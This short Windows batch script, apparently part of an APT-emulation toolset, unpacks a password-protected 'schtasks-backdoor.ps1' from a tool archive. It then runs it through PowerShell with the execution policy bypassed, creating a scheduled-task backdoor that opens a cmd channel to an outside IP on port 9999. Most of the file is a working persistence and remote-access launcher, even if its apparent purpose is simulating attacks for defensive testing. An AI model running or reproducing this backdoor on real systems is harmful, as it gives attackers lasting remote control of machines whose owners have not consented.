@ECHO OFF

ECHO ===========================================================================
ECHO Scheduled Task XML
ECHO.
ECHO Creates a scheduled task via XML file using Invoke-SchtasksBackdoor.ps1
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o"%APTDIR%" toolset\schtasks-backdoor.ps1 > NUL

powershell.exe -Exec ByPasS ". %APTDIR%\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2"
